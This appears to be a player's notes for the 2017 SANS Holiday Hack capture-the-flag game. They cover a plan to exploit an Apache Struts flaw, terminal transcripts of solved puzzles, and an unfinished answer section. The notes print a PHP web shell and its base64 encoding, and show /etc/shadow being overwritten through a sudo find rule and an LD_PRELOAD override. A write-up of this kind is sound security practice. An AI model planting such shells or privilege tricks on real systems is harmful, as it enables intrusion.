# Great Pages

[Page 1](https://www.holidayhackchallenge.com/2017/pages/6dda7650725302f59ea42047206bd4ee5f928d19/GreatBookPage1.pdf)
[Page 2](https://www.holidayhackchallenge.com/2017/pages/aa814d1c25455480942cb4106e6cde84be86fb30/GreatBookPage2.pdf)
[Page 3](https://www.holidayhackchallenge.com/2017/pages/57737da397cbfda84e88b573cd96d45fcf34a5da/GreatBookPage3.pdf)
[Page 4](https://www.holidayhackchallenge.com/2017/pages/f192a884f68af24ae55d9d9ad4adf8d3a3995258/GreatBookPage4.pdf)
[Page 5](https://www.holidayhackchallenge.com/2017/pages/05c0cacc8cfb96bb5531540e9b2b839a0604225f/GreatBookPage5.pdf)
[Page 6](https://www.holidayhackchallenge.com/2017/pages/8943e0524e1bf0ea8c7968e85b2444323cb237af/GreatBookPage6.pdf)

# Challenge

## 1) Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?

[Page 1](https://www.holidayhackchallenge.com/2017/pages/6dda7650725302f59ea42047206bd4ee5f928d19/GreatBookPage1.pdf)

ANSWER: About This Book...

## 2) Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?

There is a link to the development version. The div is hidden.

```
    <!-- Development version -->
    <a href="http://dev.northpolechristmastown.com" style="display: none;">Access Development Version</a>
```
The dev page states it's running apache struts at the bottom of the page.

Use the struts vuln

[cve-2017-9805.py](https://github.com/chrisjd20/cve-2017-9805.py)

Hints from Sparkle Redberry in the Winconceivable: The Cliffs of Winsanity Level:
1. We're excited to debut the new Letters to Santa site this year. Alabaster worked hard on that project for over a year. I got to work with the development version of the site early on in the project lifecycle.
2. Near the end of the development we had to rush a few things to get the new site moved to production. Some development content on the letter page should probably have been removed, but ended up marked as hidden to avoid added change control paperwork.
3. Alabaster's primary backend experience is with Apache Struts. I love Apache and have a local instance set up on my home computer with a web shell. Web shells are great as a backdoor for me to access my system remotely. I just choose a really long complex file name so that no one else knows how to access it.
4. A simple web shell is to create a PHP file in the web root with `<?php echo "<pre>" . shell_exec($_GET['e']) . "</pre>"; ?>`. Then, I visit the URL with my commands. For example, http://server/complexFileName.php?e=ls.
5. There are lots of different web shell tools available. [You can get a simple PHP web shell that is easy to use here.](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985)
6. That business with Equal-Facts Inc was really unfortunate. I understand there are a lot of different exploits available for those vulnerable systems. Fortunately, Alabaster said he tested for CVE-2017-5638 and it was NOT vulnerable. Hope he checked the others too.
7. Apache Struts uses XML. I always had problems making proper XML formatting because of special characters. I either had to encode my data or escape the characters properly so the XML wouldn't break. I actually just checked and there are lots of different exploits out there for vulnerable systems. [Here is a useful article.](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code)
8. Pro developer tip: Sometimes developers hard code credentials into their development files. Never do this, or at least make sure you take them out before publishing them or putting them into production. You also should avoid reusing credentials for different services, even on the same system.

php code:
```php
<?php echo "<pre>" . shell_exec($_GET['e']) . "</pre>"; ?>
```

base64:
PD9waHAgZWNobyAiPHByZT4iIC4gc2hlbGxfZXhlYygkX0dFVFsnZSddKSAuICI8L3ByZT4iOyA/Pgo=

command:
echo PD9waHAgZWNobyAiPHByZT4iIC4gc2hlbGxfZXhlYygkX0dFVFsnZSddKSAuICI8L3ByZT4iOyA/Pgo= | base64 -d | 

ANSWER:

# Terminals

## Winconceivable: The Cliffs of Winsanity
[Game](https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&uid=ee838751-39b4-423a-8d67-6d935c88d650)
```
                ___,@
               /  <
          ,_  /    \  _,
      ?    \`/______\`/
   ,_(_).  |; (e  e) ;|
    \___ \ \/\   7  /\/    _\8/_
        \/\   \'=='/      | /| /|
         \ \___)--(_______|//|//|
          \___  ()  _____/|/_|/_|
             /  ()  \    `----'
            /   ()   \
           '-.______.-'
   jgs   _    |_||_|    _
        (@____) || (____@)
         \______||______/
My name is Sparkle Redberry, and I need your help.
My server is atwist, and I fear I may yelp.
Help me kill the troublesome process gone awry.
I will return the favor with a gift before nigh.
Kill the "santaslittlehelperd" process to complete this challenge.
elf@95e7d11fd705:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
elf          1  0.0  0.0  18028  2844 pts/0    Ss   22:38   0:00 /bin/bash /sbin/init
elf          8  0.0  0.0   4224   656 pts/0    S    22:38   0:00 /usr/bin/santaslittlehelperd
elf         11  0.1  0.0  13528  6404 pts/0    S    22:38   0:00 /sbin/kworker
elf         12  0.0  0.0  18248  3200 pts/0    S    22:38   0:00 /bin/bash
elf         18  0.5  0.0  71468 26436 pts/0    S    22:38   0:00 /sbin/kworker
elf         91  0.0  0.0  34424  2920 pts/0    R+   22:40   0:00 ps aux
elf@95e7d11fd705:~$ alias
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;
s/[;&|]\s*alert$//'\'')"'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias kill='true'
alias killall='true'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'
alias pkill='true'
alias skill='true'
elf@95e7d11fd705:~$ unalias kill 
elf@95e7d11fd705:~$ kill -9 8
elf@95e7d11fd705:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
elf          1  0.0  0.0  18028  2844 pts/0    Ss   22:38   0:00 /bin/bash /sbin/init
elf         12  0.0  0.0  18248  3320 pts/0    S    22:38   0:00 /bin/bash
elf        110  0.0  0.0  34424  2860 pts/0    R+   22:40   0:00 ps aux
elf@95e7d11fd705:~$ 
```

## Winter Wonder Landing
[Game](https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=eb5282de-5e43-4813-8ada-5aee3cdb101e&uid=ee838751-39b4-423a-8d67-6d935c88d650)

```
                                 |
                               \ ' /
                             -- (*) --
                                >*<
                               >0<@<
                              >>>@<<*
                             >@>*<0<<<
                            >*>>@<<<@<<
                           >@>>0<<<*<<@<
                          >*>>0<<@<<<@<<<
                         >@>>*<<@<>*<<0<*<
           \*/          >0>>*<<@<>0><<*<@<<
       ___\\U//___     >*>>@><0<<*>>@><*<0<<
       |\\ | | \\|    >@>>0<*<0>>@<<0<<<*<@<<  
       | \\| | _(UU)_ >((*))_>0><*<0><@<<<0<*<
       |\ \| || / //||.*.*.*.|>>@<<*<<@>><0<<<
       |\\_|_|&&_// ||*.*.*.*|_\\db//_               
       """"|'.'.'.|~~|.*.*.*|     ____|_
           |'.'.'.|   ^^^^^^|____|>>>>>>|
           ~~~~~~~~         '""""`------'
My name is Bushy Evergreen, and I have a problem for you.
I think a server got owned, and I can only offer a clue.
We use the system for chat, to keep toy production running.
Can you help us recover from the server connection shunning?
Find and run the elftalkd binary to complete this challenge.
elf@f666a50bd0a2:~$ alias
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'
elf@f666a50bd0a2:~$ which find
/usr/local/bin/find
elf@f666a50bd0a2:~$ find 
bash: /usr/local/bin/find: cannot execute binary file: Exec format error
elf@f666a50bd0a2:~$ /usr/bin/find / -iname elftalkd
/usr/bin/find: '/var/cache/ldconfig': Permission denied
/usr/bin/find: '/var/cache/apt/archives/partial': Permission denied
/usr/bin/find: '/var/lib/apt/lists/partial': Permission denied
/run/elftalk/bin/elftalkd
/usr/bin/find: '/proc/tty/driver': Permission denied
/usr/bin/find: '/root': Permission denied
elf@f666a50bd0a2:~$ /run/elftalk/bin/elftalkd
        Running in interactive mode
        --== Initializing elftalkd ==--
Initializing Messaging System!
Nice-O-Meter configured to 0.90 sensitivity.
Acquiring messages from local networks...
--== Initialization Complete ==--

      _  __ _        _ _       _ 
     | |/ _| |      | | |     | |
  ___| | |_| |_ __ _| | | ____| |
 / _ \ |  _| __/ _` | | |/ / _` |
|  __/ | | | || (_| | |   < (_| |
 \___|_|_|  \__\__,_|_|_|\_\__,_|
-*> elftalkd! <*-
Version 9000.1 (Build 31337) 
By Santa Claus & The Elf Team
Copyright (C) 2017 NotActuallyCopyrighted. No actual rights reserved.
Using libc6 version 2.23-0ubuntu9
LANG=en_US.UTF-8
Timezone=UTC
Commencing Elf Talk Daemon (pid=6021)... done!
Background daemon...
elf@f666a50bd0a2:~$ 
```

## Cryokinetic Magic
[Game](https://2017.holidayhackchallenge.com/game/a1f7ac49-8210-436b-9e25-0c19f9ebfe02)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=da6d34d1-012b-420b-a7d5-369914353578&uid=ee838751-39b4-423a-8d67-6d935c88d650)

```
                     ___
                    / __'.     .-"""-.
              .-""-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`
My name is Holly Evergreen, and I have a conundrum.
I broke the candy cane striper, and I'm near throwing a tantrum.
Assembly lines have stopped since the elves can't get their candy cane fix.
We hope you can start the striper once again, with your vast bag of tricks.
Run the CandyCaneStriper executable to complete this challenge.
elf@d6d2285095a4:~$ ls -al
total 68
drwxr-xr-x 1 elf  elf   4096 Dec 15 20:00 .
drwxr-xr-x 1 root root  4096 Dec  5 19:31 ..
-rw-r--r-- 1 elf  elf    220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 root root  3143 Dec 15 19:59 .bashrc
-rw-r--r-- 1 elf  elf    655 May 16  2017 .profile
-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriper
elf@d6d2285095a4:~$ ./CandyCaneStriper
bash: ./CandyCaneStriper: Permission denied
elf@d6d2285095a4:~$ ls /lib64
ld-linux-x86-64.so.2
elf@d6d2285095a4:~$ /lib64/ld-linux-x86-64.so.2 ./CandyCaneStriper
                   _..._
                 .'\\ //`,      
                /\\.'``'.=",
               / \/     ;==|
              /\\/    .'\`,`
             / \/     `""`
            /\\/
           /\\/
          /\ /
         /\\/
        /`\/
        \\/
         `
The candy cane striping machine is up and running!
elf@d6d2285095a4:~$ 
```

## There's Snow Place Like Home
[Game](https://2017.holidayhackchallenge.com/game/41a1e6bb-60c3-4695-ad04-514fbcc76afa)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&uid=ee838751-39b4-423a-8d67-6d935c88d650)

```
                             ______
                          .-"""".._'.       _,##
                   _..__ |.-"""-.|  |   _,##'`-._
                  (_____)||_____||  |_,##'`-._,##'`
                  _|   |.;-""-.  |  |#'`-._,##'`
               _.;_ `--' `\    \ |.'`\._,##'`
              /.-.\ `\     |.-";.`_, |##'`
              |\__/   | _..;__  |'-' /
              '.____.'_.-`)\--' /'-'`
               //||\\(_.-'_,'-'`
             (`-...-')_,##'`
      jgs _,##`-..,-;##`
       _,##'`-._,##'`
    _,##'`-._,##'`
      `-._,##'`
My name is Pepper Minstix, and I need your help with my plight.
I've crashed the Christmas toy train, for which I am quite contrite.
I should not have interfered, hacking it was foolish in hindsight.
If you can get it running again, I will reward you with a gift of delight.
total 444
-rwxr-xr-x 1 root root 454636 Dec  7 18:43 trainstartup
elf@e4ee9dc21cae:~$ file trainstartup
trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=005de4685
e8563d10b3de3e0be7d6fdd7ed732eb, not stripped
elf@e4ee9dc21cae:~$ qemu-arm trainstartup
                             ______
    Merry Christmas
    Merry Christmas
v
>*<
^
/o\
/   \               @.·
/~~   \                .
/ ° ~~  \         · .    
/      ~~ \       ◆  ·    
/     °   ~~\    ·     0
/~~           \   .─··─ · o
             /°  ~~  .*· · . \  ├──┼──┤                                        
              │  ──┬─°─┬─°─°─°─ └──┴──┘                                        
≠==≠==≠==≠==──┼──=≠     ≠=≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠===≠
              │   /└───┘\┌───┐       ┌┐                                        
                         └───┘    /▒▒▒▒                                        
≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠=°≠=°≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠
You did it! Thank you!
elf@9f82b8f65b29:~$ 
```

## Bumbles Bounce
[Game](https://2017.holidayhackchallenge.com/game/dbb44df8-af5e-4136-b72e-ebd9dfb32b4a)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&uid=ee838751-39b4-423a-8d67-6d935c88d650)

```
                           ._    _.
                           (_)  (_)                  <> \  / <>
                            .\::/.                   \_\/  \/_/ 
           .:.          _.=._\\//_.=._                  \\//
      ..   \o/   ..      '=' //\\ '='             _<>_\_\<>/_/_<>_
      :o|   |   |o:         '/::\'                 <> / /<>\ \ <>
       ~ '. ' .' ~         (_)  (_)      _    _       _ //\\ _
           >O<             '      '     /_/  \_\     / /\  /\ \
       _ .' . '. _                        \\//       <> /  \ <>
      :o|   |   |o:                   /\_\\><//_/\
      ''   /o\   ''     '.|  |.'      \/ //><\\ \/
           ':'        . ~~\  /~~ .       _//\\_
jgs                   _\_._\/_._/_      \_\  /_/ 
                       / ' /\ ' \                   \o/
       o              ' __/  \__ '              _o/.:|:.\o_
  o    :    o         ' .'|  |'.                  .\:|:/.
    '.\'/.'                 .                 -=>>::>o<::<<=-
    :->@<-:                 :                   _ '/:|:\' _
    .'/.\'.           '.___/*\___.'              o\':|:'/o 
  o    :    o           \* \ / */                   /o\
       o                 >--X--<
                        /*_/ \_*\
                      .'   \*/   '.
                            :
                            '
Minty Candycane here, I need your help straight away.
We're having an argument about browser popularity stray.
Use the supplied log file from our server in the North Pole.
Identifying the least-popular browser is your noteworthy goal.
total 28704
-rw-r--r-- 1 root root 24191488 Dec  4 17:11 access.log
-rwxr-xr-x 1 root root  5197336 Dec 11 17:31 runtoanswer
elf@c43edd6eda2b:~$ grep -o '"[^"]*"$' access.log| sort | uniq -c | sort -n | head -n 1
      1 "Dillo/3.0.5"
elf@c43edd6eda2b:~$ ./runtoanswer
Starting up, please wait......
Enter the name of the least popular browser in the web log: Dillo/3.0.5
That is the least common browser in the web log! Congratulations!
elf@c43edd6eda2b:~$ 
```

## I Don't Think We're In Kansas Anymore
[Game](https://2017.holidayhackchallenge.com/game/5bbfc970-71d2-4c9d-816c-25955536c168)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&uid=ee838751-39b4-423a-8d67-6d935c88d650)

```
                       *
                      .~'
                     O'~..
                    ~'O'~..
                   ~'O'~..~'
                  O'~..~'O'~.
                 .~'O'~..~'O'~
                ..~'O'~..~'O'~.
               .~'O'~..~'O'~..~'
              O'~..~'O'~..~'O'~..
             ~'O'~..~'O'~..~'O'~..
            ~'O'~..~'O'~..~'O'~..~'
           O'~..~'O'~..~'O'~..~'O'~.
          .~'O'~..~'O'~..~'O'~..~'O'~
         ..~'O'~..~'O'~..~'O'~..~'O'~.
        .~'O'~..~'O'~..~'O'~..~'O'~..~'
       O'~..~'O'~..~'O'~..~'O'~..~'O'~..
      ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
     ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
    O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
   .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~
  ..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
 .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
Sugarplum Mary is in a tizzy, we hope you can assist.
Christmas songs abound, with many likes in our midst.
The database is populated, ready for you to address.
Identify the song whose popularity is the best.
total 20684
-rw-r--r-- 1 root root 15982592 Nov 29 19:28 christmassongs.db
-rwxr-xr-x 1 root root  5197352 Dec  7 15:10 runtoanswer
elf@9cb73137ef01:~$ /usr/bin/sqlite3 christmassongs.db 
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
sqlite> select s.title, count(*) from songs s, likes l where l.songid=s.id group by s.title order by count(*) desc limit 5;
Stairway to Heaven|11325
Joy to the World|2162
The Little Boy that Santa Claus Forgot|2140
I Farted on Santa's Lap (Now Christmas Is Gonna Stink for Me)|2132
Christmas Memories|2129
sqlite> 
elf@9cb73137ef01:~$ ./runtoanswer 
Starting up, please wait......
Enter the name of the song with the most likes: Stairway to Heaven
That is the #1 Christmas song, congratulations!
elf@9cb73137ef01:~$ 
```

[Poppies](https://2017.holidayhackchallenge.com/assets/game/textures/poppies-f059c6edbcc20f71cba374496764ed0d.png)
[Transparent image](https://images.vexels.com/media/users/3/142236/isolated/preview/5813595300ed1fd400a76ec2d9958144-fire-smoke-flame-by-vexels.png)


## Oh Wait! Maybe WE Are...
[Game](https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&uid=ee838751-39b4-423a-8d67-6d935c88d650)

```
              \ /
            -->*<--
              /o\
             /_\_\
            /_/_0_\
           /_o_\_\_\
          /_/_/_/_/o\
         /@\_\_\@\_\_\
        /_/_/O/_/_/_/_\
       /_\_\_\_\_\o\_\_\
      /_/0/_/_/_0_/_/@/_\
     /_\_\_\_\_\_\_\_\_\_\
    /_/o/_/_/@/_/_/o/_/0/_\
   jgs       [___]  
My name is Shinny Upatree, and I've made a big mistake.
I fear it's worse than the time I served everyone bad hake.
I've deleted an important file, which suppressed my server access.
I can offer you a gift, if you can fix my ill-fated redress.
Restore /etc/shadow with the contents of /etc/shadow.bak, then run "inspect_da_box" to complete this challenge.
Hint: What commands can you run with sudo?
elf@efe5512c7bd3:~$ cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
# Host alias specification
# User alias specification
# Cmnd alias specification
# User privilege specification
root    ALL=(ALL:ALL) ALL
# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL
# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL
# The elf user can run `find` with the shadow group
elf             ALL=(:shadow) NOPASSWD:/usr/bin/find
# See sudoers(5) for more information on "#include" directives:
#includedir /etc/sudoers.d
elf@efe5512c7bd3:~$ sudo -g shadow /usr/bin/find /etc/shadow.bak -exec cp /etc/shadow.bak /etc/shadow \;
elf@efe5512c7bd3:~$ inspect_da_box 
                     ___
                    / __'.     .-"""-.
              .-""-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`
/etc/shadow has been successfully restored!
elf@efe5512c7bd3:~$ 
```

## We're Off To See The...
[Game](https://2017.holidayhackchallenge.com/game/30a9c19a-f931-4367-9922-d20b91314eec)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=96452ffb-5153-4473-9fe4-f0ff7921308e&uid=ee838751-39b4-423a-8d67-6d935c88d650)

```
                 .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
               _(_      _Y_      _Y_      _Y_      _Y_      _)_
              [___]    [___]    [___]    [___]    [___]    [___]
              /:' \    /:' \    /:' \    /:' \    /:' \    /:' \
             |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
             \::.  /  \::.  /  \::.  /  \::.  /  \::.  /  \::.  /
         jgs  \::./    \::./    \::./    \::./    \::./    \::./
               '='      '='      '='      '='      '='      '='
Wunorse Openslae has a special challenge for you.
Run the given binary, make it return 42.
Use the partial source for hints, it is just a clue.
You will need to write your own code, but only a line or two.
total 24
-rwxr-xr-x 1 root root 18000 Dec  4 14:29 isit42
-rw-r--r-- 1 root root   654 Dec  4 14:29 isit42.c.un
elf@ad986ac63ab1:~$ cat isit42.c.un
#include <stdio.h>
// DATA CORRUPTION ERROR
// MUCH OF THIS CODE HAS BEEN LOST
// FORTUNATELY, YOU DON'T NEED IT FOR THIS CHALLENGE
// MAKE THE isit42 BINARY RETURN 42
// YOU'LL NEED TO WRITE A SEPERATE C SOURCE TO WIN EVERY TIME
int getrand() {
    srand((unsigned int)time(NULL)); 
    printf("Calling rand() to select a random number.\n");
    // The prototype for rand is: int rand(void);
    return rand() % 4096; // returns a pseudo-random integer between 0 and 4096
}
int main() {
    sleep(3);
    int randnum = getrand();
    if (randnum == 42) {
        printf("Yay!\n");
    } else {
        printf("Boo!\n");
    }
    return randnum;
}
elf@ad986ac63ab1:~$ vi srand.c
elf@ad986ac63ab1:~$ cat srand.c
int rand(unsigned int *seed) {
    return 42;
}
elf@ad986ac63ab1:~$ gcc -o srand.so -ldl -shared srand.c
elf@ad986ac63ab1:~$ LD_PRELOAD=`pwd`/srand.so ./isit42 
Starting up ... done.
Calling rand() to select a random number.
                 .-. 
                .;;\ ||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______ 
               /::::\|/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |
              /::::'();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||
            |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_ 
        ,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |
         \,`////""""\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |
         | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|
          \/|(_) () (_)|\/ 
            \   '()'   /            ______    _______  _______  ___      ___      __   __    ___   _______ 
            _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |
          /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|
         / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____ 
        /  |o`""""""""`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |
       `.__/     ()     \__.'      |   |  | ||   |___ |   _   ||       ||       |  |   |    |   |  _____| |
       |  | ___      ___ |  |      |___|  |_||_______||__| |__||_______||_______|  |___|    |___| |_______|
       /  \|---|    |---|/  \ 
       |  (|42 | () | DA|)  |       _   ___  _______ 
       \  /;---'    '---;\  /      | | |   ||       |
        `` \ ___ /\ ___ / ``       | |_|   ||____   |
            `|  |  |  |`           |       | ____|  |
      jgs    |  |  |  |            |___    || ______| ___ 
       _._  |\|\/||\/|/|  _._          |   || |_____ |   |
      / .-\ |~~~~||~~~~| /-. \         |___||_______||___|
      | \__.'    ||    '.__/ |
       `---------''---------` 
Congratulations! You've won, and have successfully completed this challenge.
elf@ad986ac63ab1:~$ 
```
